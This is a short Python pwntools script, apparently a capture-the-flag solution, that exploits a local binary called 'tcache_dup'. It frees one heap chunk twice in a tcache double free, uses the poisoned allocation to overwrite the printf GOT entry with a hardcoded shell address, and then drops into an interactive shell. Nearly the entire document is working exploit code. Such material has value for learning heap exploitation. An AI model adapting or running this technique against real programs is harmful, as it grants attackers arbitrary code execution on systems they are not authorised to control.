from pwn import *
context.update(log_level = 'debug')
p = None
def Create(size, data):
    p.sendlineafter('> ', '1')
    p.sendlineafter('Size: ', str(size))
    p.sendlineafter('Data: ', data)
def Delete(idx):
    p.sendlineafter('> ', '2')
    p.sendlineafter('idx: ', str(idx))

p = process('tcache_dup')
elf = ELF('tcache_dup')

addr_got_printf = elf.got['printf']
addr_shell = 0x0400AB0

Create(0x30, 'a'*0x30)
Delete(0)
Delete(0)
Create(0x30, p64(addr_got_printf))
Create(0x30, p64(addr_shell))
p.interactive()
